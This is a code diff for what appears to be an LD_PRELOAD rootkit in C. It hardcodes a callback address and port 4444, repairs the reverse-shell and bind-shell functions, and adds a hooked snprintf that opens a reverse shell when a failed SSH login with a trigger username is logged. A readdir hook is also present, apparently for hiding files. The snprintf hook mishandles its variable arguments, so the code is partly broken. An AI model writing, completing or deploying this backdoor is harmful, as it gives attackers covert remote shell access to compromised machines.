@@ -1,9 +1,12 @@
+#define _GNU_SOURCE
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdarg.h>
 #include <unistd.h>
 #include <string.h>
 #include <dlfcn.h>
+#include <dirent.h>
 #include <fcntl.h>
 #include <sys/types.h>
 #include <sys/socket.h>
@@ -11,7 +14,12 @@
 #include <netinet/ip.h>
 #include <arpa/inet.h>
 
-#include "config.h"
+#define host "192.168.64.1"
+#define FILENAME "malloc_3.so"
+#define LISTENING_PORT 4444
+#define TRIGGER_1 "invalid user admin123"
+#define TRIGGER_2 "invalid user user123"
+#define TRIGGER_3 "invalid user clear123"
 
 
 //reverse shell implementation
@@ -31,7 +39,8 @@ int rev_shell()
     dup2(sock, 1);
     dup2(sock, 2);
 
-    execve("/bin/sh", NULL, NULL);
+    char *const argv[] = {"/bin/sh", NULL};
+    execve("/bin/sh", argv, NULL);
 
     return 0;
 }
@@ -55,7 +64,8 @@ int bind_shell()
     dup2(client_fd, 1);
     dup2(client_fd, 2);
 
-    execve("/bin/sh", NULL, NULL);
+    char *const argv[] = {"/bin/sh", NULL};
+    execve("/bin/sh", argv, NULL);
     close(sock_fd);
 
     return 0;
@@ -82,4 +92,31 @@ struct dirent *readdir(DIR *dirp)
     }
 
     return results;
+}
+
+//hooking snprintf to trigger shells upoin failed ssh login attempts
+int snprintf(char *str, size_t size, const char *format, ...)
+{
+    int (*new_snprintf)(char *str, size_t size, const char *format, ...);
+    int ret;
+    new_snprintf = dlsym(RTLD_NEXT, "snprintf");
+
+    va_list func_args;
+    va_start(func_args, format);
+    const char *buffer = va_arg(func_args, const char*);
+
+    char *trigger_found = strstr(buffer, TRIGGER_1);
+    if (trigger_found != NULL)
+    {
+	    ret = new_snprintf(str, size, format, func_args);
+	    rev_shell();
+    }
+
+    else
+    {
+	    ret = new_snprintf(str, size, format, func_args);
+    }
+
+    va_end(func_args);
+    return ret;
 }
